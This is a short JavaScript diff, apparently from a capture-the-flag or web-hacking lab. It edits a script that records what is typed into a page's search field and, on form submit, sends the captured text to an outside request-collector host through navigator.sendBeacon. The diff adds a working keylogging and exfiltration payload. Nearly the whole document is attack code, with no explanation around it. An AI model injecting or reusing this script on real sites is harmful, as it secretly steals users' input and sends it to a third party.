@@ -3,15 +3,14 @@ const search_word = document.getElementsByName("search_word")[0];
 let search_keylog = "";
 
 search_word.addEventListener("input", e => {
-    search_keylog = e.target.value;
+  search_keylog = e.target.value;
 });
 
-const search_btn = document.getElementsByTagName("button")[0];
+const form = search_word.closest("form");
 
-search_btn.addEventListener("click", e => {
-    //e.preventDefault();
-    navigator.sendBeacon(
-        "https://ainvyph.request.dreamhack.games",
-        search_keylog
-    );
+form.addEventListener("submit", () => {
+  navigator.sendBeacon(
+    "https://hbeqqxv.request.dreamhack.games",
+    search_keylog
+  );
 });
